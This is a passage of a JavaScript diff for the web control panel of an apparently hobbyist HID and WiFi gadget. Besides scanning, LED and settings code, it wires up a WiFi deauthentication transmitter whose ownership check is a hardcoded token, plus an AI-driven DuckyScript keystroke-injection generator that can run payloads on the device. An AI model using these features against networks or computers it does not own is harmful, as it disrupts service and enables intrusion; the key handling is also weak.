+    await fmFetchPost('/fm/mkdir?path=' + encodeURIComponent('/autorun')).catch(() => {}); // ignore if exists
+    // Upload file
+    const formData = new FormData();
+    const blob = new Blob([script], { type: 'text/plain' });
+    formData.append('file', blob, 'autorun.txt');
+    
+    const uploadUrl = fmBase() + '/fm/upload?path=' + encodeURIComponent('/autorun');
+    const crossOrigin = new URL(uploadUrl).origin !== location.origin;
+    const opts = crossOrigin
+      ? { method: 'POST', mode: 'no-cors', body: formData }
+      : { method: 'POST', headers: { 'Accept': '*/*' }, body: formData };
+      
+    await fetch(uploadUrl, opts);
+    toast('Auto-Run script saved ✓');
+  } catch (e) {
+    toast('Failed to save Auto-Run: ' + e.message, 'err');
+  }
+}
+
+async function deleteAutoRun() {
+  if (!confirm("WARNING: Disabling Auto-Run will permanently delete your autorun.txt script. Please take a backup. Continue?")) {
+    return;
+  }
+  
+  try {
+    const delUrl = fmBase() + '/fm/delete?path=' + encodeURIComponent('/autorun/autorun.txt');
+    const opts = { method: 'POST' };
+    await fetch(delUrl, opts);
+    toast('Auto-Run disabled and script deleted ✓');
+  } catch (e) {
+    toast('Failed to delete Auto-Run script', 'err');
+  }
+}
+
+async function saveTypingDelay() {
+  const d = $('typingDelayInput').value.trim();
+  if (d === '') return;
+  try {
+    await deviceFetch('/saveTypingDelay', {
+      method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'delay=' + encodeURIComponent(d)
+    });
+    toast('Typing Delay saved ✓');
+  } catch (e) {
+    toast('Failed to save delay', 'err');
+  }
+}
+
+// ─── API Key ───
+async function saveApiKey() {
+  const k = $('apiKeyInput').value.trim();
+  if (!k) { toast('Enter a key first', 'warn'); return; }
+  // Save locally so AI works even when not on device
+  GROQ_KEY = k;
+  localStorage.setItem('gc_groq_key', k);
+  if (k.startsWith('sk-or-')) {
+    OPENROUTER_KEY = k;
+    localStorage.setItem('gc_openrouter_key', k);
+  }
+  // Also save to device EEPROM if connected
+  try {
+    await deviceFetch('/saveApiKey', {
+      method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'apiKey=' + encodeURIComponent(k)
+    });
+  } catch (e) { /* device might not be connected, that's ok */ }
+  toast('API Key saved ✓');
+  $('apiKeyInput').value = '';
+}
+function clearApiKey() {
+  if (!confirm('Clear API key?')) return;
+  GROQ_KEY = '';
+  localStorage.removeItem('gc_groq_key');
+  deviceFetch('/saveApiKey', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'apiKey=' })
+    .then(() => toast('Key cleared', 'warn'));
+}
+
+// ─── OpenRouter API Key (For AI Agent) ───
+let OPENROUTER_KEY = localStorage.getItem('gc_openrouter_key') || '';
+
+function saveOpenRouterApiKey() {
+  const k = $('openrouterApiKeyInput')?.value?.trim();
+  if (!k) { toast('Enter OpenRouter API key first', 'warn'); return; }
+  OPENROUTER_KEY = k;
+  localStorage.setItem('gc_openrouter_key', k);
+  toast('OpenRouter API Key saved ✓');
+  if ($('openrouterApiKeyInput')) $('openrouterApiKeyInput').value = '';
+}
+
+function clearOpenRouterApiKey() {
+  if (!confirm('Clear OpenRouter API key?')) return;
+  OPENROUTER_KEY = '';
+  localStorage.removeItem('gc_openrouter_key');
+  toast('OpenRouter Key cleared', 'warn');
+}
+// Try to load API key from device EEPROM on startup
+// The device embeds the key in /aigenerate page as: const SAVED_KEY = "gsk_...";
+// Only runs when on the device (HTTP same-origin), not from GitHub Pages (HTTPS)
+async function loadApiKeyFromDevice() {
+  if (GROQ_KEY) { console.log('[GhostChip] API key already loaded from localStorage'); return; }
+  if (location.protocol === 'https:') { console.log('[GhostChip] On HTTPS — skipping device key fetch. Use Settings to enter key.'); return; }
+  try {
+    const url = getProxyUrl(BASE() + '/aigenerate');
+    console.log('[GhostChip] Fetching API key from:', url);
+    const r = await fetch(url);
+    const html = await r.text();
+    const m = html.match(/const\s+SAVED_KEY\s*=\s*"([^"]+)"/);
+    if (m && m[1] && m[1].length > 4) {
+      GROQ_KEY = m[1];
+      localStorage.setItem('gc_groq_key', m[1]);
+      console.log('[GhostChip] API key loaded from device ✓');
+      toast('API key loaded from device ✓', 'ok', 2000);
+    } else {
+      console.log('[GhostChip] No SAVED_KEY found in /aigenerate response');
+    }
+  } catch (e) { console.log('[GhostChip] Device not reachable:', e.message); }
+}
+
+// ─── Scan Tabs ───
+function switchScan(name) {
+  document.querySelectorAll('.scan-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.seg').forEach(s => s.classList.remove('active'));
+  $('scan-' + name).classList.add('active');
+  $('seg-' + name).classList.add('active');
+}
+
+// ─── Signal Bars ───
+function signalBars(rssi) {
+  let lv = rssi >= -55 ? 4 : rssi >= -65 ? 3 : rssi >= -75 ? 2 : rssi >= -85 ? 1 : 0;
+  const h = [4, 7, 10, 14];
+  return '<div class="net-signal">' + h.map((height, i) =>
+    `<span style="height:${height}px" class="${i < lv ? 'lit' : ''}"></span>`
+  ).join('') + '</div>';
+}
+
+// ─── WiFi Scan ───
+async function scanWifi() {
+  const list = $('wifiResults');
+  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div>';
+  try {
+    const nets = await deviceGet('/wifi/scan');
+    if (!nets.length) { list.innerHTML = '<div class="empty-state">No networks found</div>'; toast('No networks', 'warn'); return; }
+    nets.sort((a, b) => b.rssi - a.rssi);
+    list.innerHTML = nets.map(n => `
+      <div class="net-card">
+        <div class="net-info">
+          <div class="net-ssid">${n.secure ? '🔒' : '🔓'} ${n.ssid || '(hidden)'}</div>
+          <div class="net-meta">CH ${n.channel || '?'} · ${n.rssi} dBm · ${n.bssid || ''}</div>
+        </div>
+        ${signalBars(n.rssi)}
+      </div>
+    `).join('');
+    toast('Found ' + nets.length + ' networks');
+  } catch (e) {
+    list.innerHTML = '<div class="empty-state">Scan failed — check connection</div>';
+    toast('WiFi scan failed', 'err');
+  }
+}
+
+// ─── WiFi Settings Scan ───
+// ═══════════════════════════════════════════════════
+//  WIFI SCANNER
+// ═══════════════════════════════════════════════════
+async function scanWifiSettings() {
+  const list = $('wifiSettingsList');
+  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div>';
+  try {
+    const nets = await deviceGet('/wifi/scan');
+    list.innerHTML = nets.sort((a, b) => b.rssi - a.rssi).map(n => `
+      <div class="net-card" onclick="selectWifi('${(n.ssid || '').replace(/'/g, "\\'")}')">
+        <div class="net-info">
+          <div class="net-ssid">${n.secure ? '🔒' : '🔓'} ${n.ssid || '(hidden)'}</div>
+          <div class="net-meta">${n.rssi} dBm</div>
+        </div>
+        ${signalBars(n.rssi)}
+      </div>
+    `).join('');
+  } catch (e) { list.innerHTML = ''; toast('Scan failed', 'err'); }
+}
+function selectWifi(ssid) {
+  selectedSsid = ssid;
+  $('wifiSelSsid').textContent = ssid;
+  $('wifiPassGroup').style.display = 'block';
+  $('wifiPassInput').focus();
+}
+async function connectWifi() {
+  if (!selectedSsid) return;
+  try {
+    await deviceFetch('/wifi/connect', {
+      method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'ssid=' + encodeURIComponent(selectedSsid) + '&pass=' + encodeURIComponent($('wifiPassInput').value)
+    });
+    toast('Connected to ' + selectedSsid + ' ✓');
+  } catch (e) { toast('Connection failed', 'err'); }
+}
+
+// ─── BLE Scan ───
+async function scanBle() {
+  const list = $('bleResults');
+  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div><div class="skeleton"></div>';
+  try {
+    const devs = await deviceGet('/blescan');
+    if (!devs.length) { list.innerHTML = '<div class="empty-state">No BLE devices found</div>'; toast('No devices', 'warn'); return; }
+    devs.sort((a, b) => b.rssi - a.rssi);
+    list.innerHTML = devs.map(d => `
+      <div class="net-card">
+        <div class="net-info">
+          <div class="net-ssid">${d.flipper ? '🐬' : '📱'} ${d.name || '(unknown)'}</div>
+          <div class="net-meta">${d.mac} · ${d.rssi} dBm${d.flipper ? ' · Flipper ' + d.flipperColor : ''}</div>
+        </div>
+        ${signalBars(d.rssi)}
+      </div>
+    `).join('');
+    toast('Found ' + devs.length + ' BLE devices');
+  } catch (e) {
+    list.innerHTML = '<div class="empty-state">Scan failed</div>';
+    toast('BLE scan failed', 'err');
+  }
+}
+
+// ─── Deauth Detector ───
+// ═══════════════════════════════════════════════════
+//  DEAUTH LOGS
+// ═══════════════════════════════════════════════════
+function deauthStart() {
+  deviceFetch('/deauth/start', { method: 'POST' }).then(() => {
+    $('ddDot').className = 'dd-dot on';
+    $('ddLabel').textContent = 'Monitoring...';
+    toast('Deauth monitor started');
+    if (ddPoll) clearInterval(ddPoll);
+    ddPoll = setInterval(deauthPoll, 1500);
+  }).catch(() => toast('Failed to start', 'err'));
+}
+function deauthStop() {
+  if (ddPoll) { clearInterval(ddPoll); ddPoll = null; }
+  deviceFetch('/deauth/stop', { method: 'POST' }).then(() => {
+    $('ddDot').className = 'dd-dot';
+    $('ddLabel').textContent = 'Stopped';
+    toast('Monitor stopped', 'warn');
+  });
+}
+function deauthPoll() {
+  deviceGet('/deauth/results').then(d => {
+    if (d.events && d.events.length > ddSeen) {
+      for (let i = ddSeen; i < d.events.length; i++) {
+        const e = d.events[i];
+        const log = $('deauthLog');
+        log.innerHTML += `<span class="t-err">⚠ DEAUTH from ${e.mac} CH:${e.ch} ${e.rssi}dBm</span><br>`;
+        log.scrollTop = log.scrollHeight;
+        $('ddDot').className = 'dd-dot alert';
+        toast('⚠ Deauth: ' + e.mac, 'err', 5000);
+        setTimeout(() => { if (ddPoll) $('ddDot').className = 'dd-dot on'; }, 1200);
+      }
+      ddSeen = d.events.length;
+    }
+  }).catch(() => { });
+}
+
+
+// ═══════════════════════════════════════════════════
+//  WIFI TESTING — GATED DEAUTH (allowlist-only)
+//  All functions prefixed wifitesting* to avoid collision
+//  with the passive deauth monitor (deauthStart/deauthStop/deauthPoll).
+// ═══════════════════════════════════════════════════
+const WIFITESTING_TOKEN = 'I_OWN_THIS_NETWORK';   // must match firmware OWNERSHIP_TOKEN
+
+var wifitestingSelectedBssid = null;               // never persisted — cleared on every Stop
+var wifitestingStatusTimer   = null;
+var wifitestingLastFrames    = 0;
+
+// ── Timestamp helper ──
+function wifitestingTs() {
+  const now = new Date();
+  const hh = String(now.getHours()).padStart(2, '0');
+  const mm = String(now.getMinutes()).padStart(2, '0');
+  const ss = String(now.getSeconds()).padStart(2, '0');
+  return `[${hh}:${mm}:${ss}]`;
+}
+
+// ── Append a timestamped line to #deauthLog (shared terminal) ──
+function wifitestingLog(line, cls) {
+  const el = $('deauthLog');
+  if (!el) return;
+  const safe = String(line).replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  el.innerHTML += `<span class="wt-line${cls ? ' ' + cls : ''}">${wifitestingTs()} ${safe}</span><br>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// ── Update #wtDot + #wtLabel ──
+function wifitestingSetBadge(state, text) {
+  const dot = $('wtDot');
+  const lbl = $('wtLabel');
+  if (dot) dot.className = 'dd-dot' + (state ? ' ' + state : '');
+  if (lbl) lbl.textContent = text;
+}
+
+// ── GET /wifi/scan → parsed JSON array or [] ──
+async function wifitestingFetchScan() {
+  try {
+    const nets = await deviceGet('/wifi/scan');
+    return Array.isArray(nets) ? nets : [];
+  } catch (e) {
+    wifitestingLog('Scan request failed: ' + e.message, 't-err');
+    return [];
+  }
+}
+
+// ── Modal: dynamically built, id=wifitestingPickModal, rebuilt each call ──
+// Returns a Promise that resolves to {bssid, ssid, channel} or null if cancelled.
+function wifitestingPickTarget(nets) {
+  return new Promise(resolve => {
+    // Remove any stale instance
+    const stale = document.getElementById('wifitestingPickModal');
+    if (stale) stale.remove();
+
+    const overlay = document.createElement('div');
+    overlay.id = 'wifitestingPickModal';
+    overlay.className = 'modal-overlay';
+    overlay.style.zIndex = '9999';
+
+    const card = document.createElement('div');
+    card.className = 'modal-card';
+    card.style.cssText = 'max-width:440px; width:96%; text-align:left; padding:1.4rem;';
+
+    // Header
+    const hdr = document.createElement('div');
+    hdr.style.cssText = 'display:flex; align-items:center; justify-content:space-between; margin-bottom:14px;';
+    hdr.innerHTML = `
+      <div>
+        <div style="font-weight:800; font-size:0.95rem; color:var(--white);">🎯 Select Target Network</div>
+        <div style="font-size:0.68rem; color:var(--dim); margin-top:2px; font-family:var(--mono);">Only target networks you OWN or have written authorisation to test</div>
+      </div>`;
+    const closeBtn = document.createElement('button');
+    closeBtn.textContent = '✕';
+    closeBtn.className = 'btn btn-ghost';
+    closeBtn.style.cssText = 'padding:4px 10px; font-size:0.85rem;';
+    closeBtn.onclick = () => { overlay.remove(); resolve(null); };
+    hdr.appendChild(closeBtn);
+    card.appendChild(hdr);
+
+    // Network list
+    const list = document.createElement('div');
+    list.style.cssText = 'max-height:320px; overflow-y:auto; display:flex; flex-direction:column; gap:6px;';
+
+    if (!nets.length) {
+      list.innerHTML = '<div style="text-align:center; color:var(--dim); padding:20px; font-family:var(--mono); font-size:0.8rem;">No networks found — try scanning again</div>';
+    } else {
+      const sorted = [...nets].sort((a, b) => b.rssi - a.rssi);
+      sorted.forEach(n => {
+        const btn = document.createElement('button');
+        btn.className = 'wifitesting-pick-item';
+        btn.innerHTML = `
+          <div>
+            <div style="font-weight:700; font-size:0.82rem; color:var(--white);">${n.ssid || '(hidden)'}</div>
+            <div style="font-family:var(--mono); font-size:0.65rem; color:var(--dim);">${n.bssid} · CH${n.channel} · ${n.rssi} dBm</div>
+          </div>
+          ${typeof signalBars === 'function' ? signalBars(n.rssi) : ''}`;
+        btn.onclick = () => { overlay.remove(); resolve({ bssid: n.bssid, ssid: n.ssid || '', channel: n.channel }); };
+        list.appendChild(btn);
+      });
+    }
+    card.appendChild(list);
+
+    // Cancel footer
+    const footer = document.createElement('div');
+    footer.className = 'modal-actions';
+    footer.style.marginTop = '14px';
+    const cancelBtn = document.createElement('button');
+    cancelBtn.textContent = 'Cancel';
+    cancelBtn.className = 'btn btn-ghost';
+    cancelBtn.onclick = () => { overlay.remove(); resolve(null); };
+    footer.appendChild(cancelBtn);
+    card.appendChild(footer);
+
+    overlay.appendChild(card);
+    document.body.appendChild(overlay);
+  });
+}
+
+// ── Main entry point wired to "Arm & Start Test" button ──
+async function wifitestingStart() {
+  // Clear any running session first
+  if (wifitestingStatusTimer) { clearInterval(wifitestingStatusTimer); wifitestingStatusTimer = null; }
+  wifitestingSelectedBssid = null;                // no remembered BSSID across sessions
+
+  wifitestingSetBadge('', 'Scanning…');
+  wifitestingLog('Fresh WiFi scan initiated…', 't-dim');
+
+  // Step 1: Scan
+  const nets = await wifitestingFetchScan();
+  if (!nets.length) {
+    wifitestingSetBadge('', 'Idle');
+    wifitestingLog('No networks returned by scan.', 't-err');
+    toast('No networks found', 'err');
+    return;
+  }
+  wifitestingLog(`Scan complete — ${nets.length} network(s) found`, 't-dim');
+  wifitestingSetBadge('', 'Awaiting selection…');
+
+  // Step 2: Operator MUST pick — no auto-select
+  const target = await wifitestingPickTarget(nets);
+  if (!target) {
+    wifitestingSetBadge('', 'Idle');
+    wifitestingLog('Selection cancelled.', 't-dim');
+    return;
+  }
+  wifitestingSelectedBssid = target.bssid;
+  wifitestingLog(`Selected: ${target.ssid} [${target.bssid}] CH${target.channel}`, '');
+  wifitestingSetBadge('', 'Arming…');
+
+  // Step 3: ARM — POST /deauth/arm with ownership token
+  let armOk = false;
+  try {
+    const body = new URLSearchParams({ bssid: target.bssid, confirm: WIFITESTING_TOKEN });
+    const res  = await deviceFetch('/deauth/arm', { method: 'POST', body });
+
+    if (res && res.status === 403) {
+      wifitestingLog('ARM ✖ 403 — ownership confirmation required', 't-err');
+      wifitestingSetBadge('err', 'Error — 403');
+      toast('Arm rejected: ownership confirmation required', 'err'); return;
+    }
+    if (res && res.status === 404) {
+      wifitestingLog('ARM ✖ 404 — bssid not in scan cache', 't-err');
+      wifitestingSetBadge('err', 'Error — 404');
+      toast('Arm rejected: bssid not in scan cache', 'err'); return;
+    }
+    if (res && res.status === 405) {
+      wifitestingLog('ARM ✖ 405 — method not allowed', 't-err');
+      wifitestingSetBadge('err', 'Error — 405');
+      toast('Arm error: method not allowed', 'err'); return;
+    }
+    const json = res ? await res.json().catch(() => null) : null;
+    if (!json || !json.ok) {
+      const errTxt = (json && json.error) ? json.error : `HTTP ${res ? res.status : 'unknown'}`;
+      wifitestingLog('ARM ✖ ' + errTxt, 't-err');
+      wifitestingSetBadge('err', 'Arm failed');
+      toast('Arm failed: ' + errTxt, 'err'); return;
+    }
+    armOk = true;
+  } catch (e) {
+    wifitestingLog('ARM ✖ network error: ' + e.message, 't-err');
+    wifitestingSetBadge('err', 'Error');
+    toast('Arm error: ' + e.message, 'err'); return;
+  }
+
+  if (!armOk) return;
+  wifitestingLog('Armed ✔', 't-ok');
+  wifitestingSetBadge('on', 'Armed');
+
+  // Step 4: START — POST /deauth/start with ownership token
+  try {
+    const body = new URLSearchParams({ confirm: WIFITESTING_TOKEN, reason: '1' });
+    const res  = await deviceFetch('/deauth/start', { method: 'POST', body });
+
+    if (res && res.status === 403) {
+      wifitestingLog('START ✖ 403 — ownership confirmation required', 't-err');
+      wifitestingSetBadge('err', 'Error — 403'); toast('Start rejected: ownership confirmation required', 'err'); return;
+    }
+    if (res && res.status === 409) {
+      wifitestingLog('START ✖ 409 — not armed', 't-err');
+      wifitestingSetBadge('err', 'Error — 409'); toast('Start rejected: not armed', 'err'); return;
+    }
+    if (res && !res.ok) {
+      wifitestingLog(`START ✖ HTTP ${res.status}`, 't-err');
+      wifitestingSetBadge('err', 'Error'); toast('Start error: HTTP ' + res.status, 'err'); return;
+    }
+  } catch (e) {
+    wifitestingLog('START ✖ network error: ' + e.message, 't-err');
+    wifitestingSetBadge('err', 'Error'); toast('Start error: ' + e.message, 'err'); return;
+  }
+
+  wifitestingLog('TX started ✔ — BOOT button is the hardware kill switch', 't-ok');
+  wifitestingSetBadge('on', 'Running · 0 frames');
+  wifitestingLastFrames = 0;
+  toast('WiFi Testing running → ' + (target.ssid || target.bssid));
+
+  // Step 5: 1 Hz status poll
+  wifitestingStatusTimer = setInterval(async () => {
+    try {
+      const s = await deviceGet('/deauth/status');
+      if (!s) return;
+      const frEl = $('wtFrames');
+      if (frEl) frEl.textContent = s.frames || 0;
+      wifitestingSetBadge('on', `Running · ${s.frames || 0} frames`);
+      if (!s.running && !s.armed) {
+        clearInterval(wifitestingStatusTimer); wifitestingStatusTimer = null;
+        wifitestingSetBadge('', 'Stopped');
+        wifitestingLog(`TX stopped externally (BOOT kill switch). Total frames: ${s.frames || 0}`, 't-dim');
+      }
+    } catch (_) { /* ignore transient poll errors */ }
+  }, 1000);
+}
+
+// ── Stop — clears poller, POSTs /deauth/stop, resets badge, clears BSSID ──
+async function wifitestingStop() {
+  if (wifitestingStatusTimer) { clearInterval(wifitestingStatusTimer); wifitestingStatusTimer = null; }
+  wifitestingSelectedBssid = null;                // no BSSID remembered after stop
+  try {
+    await deviceFetch('/deauth/stop', { method: 'POST' });
+    wifitestingSetBadge('', 'Idle');
+    const frEl = $('wtFrames');
+    if (frEl) frEl.textContent = '0';
+    wifitestingLog('TX stopped by operator.', 't-dim');
+    toast('WiFi Testing stopped', 'warn');
+  } catch (e) {
+    wifitestingLog('Stop error: ' + e.message, 't-err');
+    toast('Stop failed: ' + e.message, 'err');
+  }
+}
+
+// ── Convenience (not bound to a button) ──
+async function wifitestingScanAndStart() {
+  try {
+    const target = await (async () => {
+      const nets = await wifitestingFetchScan();
+      return nets.length ? await wifitestingPickTarget(nets) : null;
+    })();
+    if (!target) return;
+    const body = new URLSearchParams({ bssid: target.bssid, confirm: WIFITESTING_TOKEN });
+    const res  = await deviceFetch('/scan_and_deauth', { method: 'POST', body });
+    if (res && res.status === 403) { wifitestingLog('scan_and_deauth ✖ 403 — ownership confirmation required', 't-err'); return; }
+    if (res && res.status === 404) { wifitestingLog('scan_and_deauth ✖ 404 — bssid not found in scan', 't-err'); return; }
+    if (res && res.ok) {
+      wifitestingLog('scan_and_deauth ✔', 't-ok');
+      wifitestingSetBadge('on', 'Running');
+      wifitestingStatusTimer = setInterval(async () => {
+        try {
+          const s = await deviceGet('/deauth/status');
+          if (!s) return;
+          wifitestingSetBadge('on', `Running · ${s.frames || 0} frames`);
+          if (!s.running && !s.armed) { clearInterval(wifitestingStatusTimer); wifitestingStatusTimer = null; wifitestingSetBadge('', 'Stopped'); }
+        } catch (_) {}
+      }, 1000);
+    }
+  } catch (e) {
+    wifitestingLog('scan_and_deauth error: ' + e.message, 't-err');
+  }
+}
+
+
+// ─── Voice Input ───
+function toggleVoice() {
+  const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+  if (!SpeechRecognition) {
+    toast('Speech recognition not supported in this browser', 'err');
+    return;
+  }
+
+  if (isListening && voiceRecog) {
+    voiceRecog.stop();
+    return;
+  }
+
+  voiceRecog = new SpeechRecognition();
+  voiceRecog.lang = 'en-US';
+  voiceRecog.interimResults = true;
+  voiceRecog.continuous = false;
+  voiceRecog.maxAlternatives = 1;
+
+  const btn = $('micBtn');
+  const prompt = $('aiPrompt');
+  let finalTranscript = prompt.value;
+
+  voiceRecog.onstart = () => {
+    isListening = true;
+    btn.classList.add('listening');
+    toast('🎙 Listening...', 'ok', 2000);
+  };
+
+  voiceRecog.onresult = (e) => {
+    let interim = '';
+    for (let i = e.resultIndex; i < e.results.length; i++) {
+      const t = e.results[i][0].transcript;
+      if (e.results[i].isFinal) {
+        finalTranscript += (finalTranscript ? ' ' : '') + t;
+      } else {
+        interim += t;
+      }
+    }
+    prompt.value = finalTranscript + (interim ? ' ' + interim : '');
+  };
+
+  voiceRecog.onend = () => {
+    isListening = false;
+    btn.classList.remove('listening');
+    if (finalTranscript.trim()) {
+      toast('Voice captured ✓', 'ok', 1500);
+    }
+  };
+
+  voiceRecog.onerror = (e) => {
+    isListening = false;
+    btn.classList.remove('listening');
+    if (e.error === 'not-allowed') {
+      toast('Microphone permission denied', 'err');
+    } else if (e.error !== 'aborted') {
+      toast('Voice error: ' + e.error, 'err');
+    }
+  };
+
+  voiceRecog.start();
+}
+
+// ─── AI Generate ───
+// ═══════════════════════════════════════════════════
+//  AI GENERATE
+// ═══════════════════════════════════════════════════
+function setTargetOS(os, btn) {
+  targetOS = os;
+  document.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+}
+function fillAi(t) { $('aiPrompt').value = t; }
+
+function getOSContext() {
+  const map = {
+    windows: 'Target OS is Windows. Use GUI r for Run dialog, cmd/powershell for terminal.',
+    macos: 'Target OS is macOS. Use GUI SPACE for Spotlight, open Terminal.app via Spotlight.',
+    linux: 'Target OS is Linux. Use CTRL ALT t to open terminal on most distros.'
+  };
+  return map[targetOS] || map.windows;
+}
+
+async function aiGenerate() {
+  const prompt = $('aiPrompt').value.trim();
+  if (!prompt) { toast('Enter a description', 'warn'); return; }
+  const btn = $('aiGenBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span> Generating...';
+
+  const keyToUse = GROQ_KEY || localStorage.getItem('gc_groq_key') || '';
+  if (!keyToUse || keyToUse.length < 5) {
+    toast('No Groq API key found. Go to Settings → save your Groq key first.', 'err');
+    btn.disabled = false;
+    btn.innerHTML = '⚡ Generate DuckyScript';
+    return;
+  }
+
+  const endpoint = 'https://api.groq.com/openai/v1/chat/completions';
+  const modelToUse = GROQ_MODEL;
+
+  $('aiOutput').value = '';
+  $('aiOutputCard').style.display = 'none';
+
+  const headers = { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + keyToUse };
+
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers,
+      body: JSON.stringify({
+        model: modelToUse,
+        messages: [
+          {
+            role: 'system',
+            content: `STRICT DUCKYSCRIPT SYNTAX RULES:
+1. ALL DuckyScript keywords and key names MUST be UPPERCASE (e.g. GUI SPACE, ENTER, STRING, DELAY 2000). NEVER write "GUI space".
+2. EXECUTING TERMINAL COMMANDS: Every shell command typed with "STRING <cmd>" MUST be followed by "ENTER" to execute it!
+   Example:
+   GUI SPACE
+   DELAY 2000
+   STRING terminal
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING mkdir ducky
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING cd ducky
+   DELAY 2000
+   ENTER
+   DELAY 2000
+   STRING echo "What is a HID attack?" > ducky.txt
+   DELAY 2000
+   ENTER
+3. Always insert DELAY 2000 after each action line.
+4. Output ONLY raw executable DuckyScript code lines. DO NOT output reasoning, thinking process, preamble, or markdown. ${getOSContext()}`
+          },
+          { role: 'user', content: prompt }
+        ],
+        temperature: 0.6,
+        top_p: 0.95,
+        max_tokens: 2048,
+        max_completion_tokens: 2048,
+        reasoning_effort: 'default',
+        stop: null
+      })
+    });
+    if (!res.ok) {
+      const err = await res.json().catch(() => ({}));
+      throw new Error(err.error?.message || 'API error: ' + res.status);
+    }
+    const data = await res.json();
+    let raw = data.choices?.[0]?.message?.content?.trim() || '';
+    let script = cleanDuckyScriptOutput(raw);
+    $('aiOutput').value = script;
+    $('aiOutputCard').style.display = 'block';
+    toast('Script generated ✓');
+  } catch (e) {
+    toast('Generation failed: ' + e.message, 'err');
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = '⚡ Generate DuckyScript';
+  }
+}
+
+// ─── Multi-OS Converter ───
+async function aiConvertOS(newOS) {
+  const script = $('aiOutput').value.trim();
+  if (!script) { toast('No script to convert', 'warn'); return; }
+
+  const keyToUse = GROQ_KEY || localStorage.getItem('gc_groq_key') || '';
+  if (!keyToUse || keyToUse.length < 5) { toast('No Groq API key. Save in Settings.', 'err'); return; }
+
+  const endpoint = 'https://api.groq.com/openai/v1/chat/completions';
+  const modelToUse = GROQ_MODEL;
+
+  const osNames = { windows: 'Windows', macos: 'macOS', linux: 'Linux' };
+  toast(`Converting to ${osNames[newOS]}...`, 'ok', 2000);
+
+  const headers = { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + keyToUse };
+
+  try {
+    const res = await fetch(endpoint, {
+      method: 'POST',
+      headers,
+      body: JSON.stringify({
+        model: modelToUse,
+        messages: [
+          { role: 'system', content: `STRICT SYSTEM INSTRUCTION: Convert the following DuckyScript payload to work on ${osNames[newOS]}. Output ONLY raw converted DuckyScript lines — no reasoning, no thinking process, no preamble, no markdown. Adapt all OS-specific commands (e.g. GUI r for Windows Run → GUI SPACE for macOS Spotlight). Always add DELAY 2000 after each action line.` },
+          { role: 'user', content: script }
+        ],
+        temperature: 1,
+        top_p: 1,
+        max_tokens: 2048,
+        max_completion_tokens: 2048,
+        reasoning_effort: 'default',
+        stop: null
+      })
+    });
+    if (!res.ok) throw new Error('API error');
+    const data = await res.json();
+    let raw = data.choices?.[0]?.message?.content?.trim() || '';
+    let converted = cleanDuckyScriptOutput(raw);
+    $('aiOutput').value = converted;
+    toast(`Converted to ${osNames[newOS]} ✓`);
+  } catch (e) { toast('Conversion failed: ' + e.message, 'err'); }
+}
+function aiCopy() {
+  navigator.clipboard.writeText($('aiOutput').value).then(() => toast('Copied ✓', 'ok', 2000));
+}
+function aiToEditor() {
+  $('editor').value = $('aiOutput').value;
+  updateLines();
+  localStorage.setItem('gc_script', $('editor').value);
+  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
+  toast('Script sent to editor ✓');
+}
+async function aiExec() {
+  const s = $('aiOutput').value.trim();
+  if (!s || !confirm('Execute AI script on device?')) return;
+  try {
+    await deviceFetch('/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'duckyscript=' + encodeURIComponent(s) });
+    toast('AI script executed ✓');
+  } catch { toast('Script sent ✓'); }
+}
+
+// ─── NeoPixel ───
+// ═══════════════════════════════════════════════════
+//  NEOPIXEL
+// ═══════════════════════════════════════════════════
+function neoToggle() {
+  neo.on = !neo.on;
+  neoUI();
+  deviceFetch('/neopixel/toggle', { method: 'POST' }).catch(() => { });
+  toast('NeoPixel ' + (neo.on ? 'ON' : 'OFF'), neo.on ? 'ok' : 'warn', 1500);
+}
+function neoUpdate() {
+  neo.bright = +$('neoBright').value;
+  neo.r = +$('neoR').value; neo.g = +$('neoG').value; neo.b = +$('neoB').value;
+  $('neoBrightV').textContent = neo.bright;
+  $('neoRV').textContent = neo.r; $('neoGV').textContent = neo.g; $('neoBV').textContent = neo.b;
+  const hex = '#' + [neo.r, neo.g, neo.b].map(v => v.toString(16).padStart(2, '0')).join('');
+  $('neoPreview').style.background = neo.on ? hex : '#222';
+  $('neoPreview').style.boxShadow = neo.on ? `0 0 14px ${hex}, 0 0 28px ${hex}44` : 'none';
+}
+function neoSet(r, g, b) {
+  neo.r = r; neo.g = g; neo.b = b;
+  $('neoR').value = r; $('neoG').value = g; $('neoB').value = b;
+  neoUpdate();
+}
+function neoUI() {
+  const t = $('neoToggle');
+  t.className = 'toggle' + (neo.on ? ' on' : '');
+  $('neoLabel').textContent = neo.on ? 'ON' : 'OFF';
+  neoUpdate();
+}
+function neoApply() {
+  deviceFetch('/neopixel/set', {
+    method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `brightness=${neo.bright}&r=${neo.r}&g=${neo.g}&b=${neo.b}`
+  }).then(() => toast('NeoPixel saved ✓')).catch(() => toast('Failed', 'err'));
+}
+
+// ─── Firmware ───
+function fwPick(input) {
+  const f = input.files[0];
+  if (!f) return;
+  $('fwInfo').style.display = 'block';
+  $('fwInfo').textContent = f.name + ' — ' + (f.size / 1024).toFixed(1) + ' KB';
+  $('flashBtn').disabled = false;
+  toast('Firmware selected: ' + f.name);
+}
+const dz = $('dropzone');
+if (dz) {
